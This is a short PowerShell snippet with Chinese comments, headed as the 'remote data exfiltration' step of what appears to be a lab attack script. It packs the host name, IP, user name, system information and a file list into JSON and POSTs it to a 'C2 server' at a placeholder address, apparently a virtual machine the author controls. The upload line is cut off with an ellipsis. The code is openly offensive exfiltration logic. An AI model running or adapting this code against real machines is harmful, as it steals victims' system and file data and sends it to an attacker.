# --- 動作 E: 遠端數據滲漏 (Exfiltration) ---
$destinationIP = "192.168.50.202" # 換成你接收端虛擬機的 IP
Write-Host "[*] 正在傳送情報至 C2 伺服器 ($destinationIP)..." -ForegroundColor Cyan

# 打包資料
$payload = @{
    hostname = $env:COMPUTERNAME
    ip       = $ip
    user     = $env:USERNAME
    info     = $sysInfo
    files    = $fileList
} | ConvertTo-Json

try {
    # 使用 HTTP POST 傳送 JSON
    Invoke-RestMethod -Uri "http://<你的IP>:8080/upload" -Method Post ...
    Write-Host "[+] 數據回傳成功。" -ForegroundColor Green
} catch {
    Write-Host "[-] 回傳失敗: 無法連接到 C2 伺服器。" -ForegroundColor Red
}
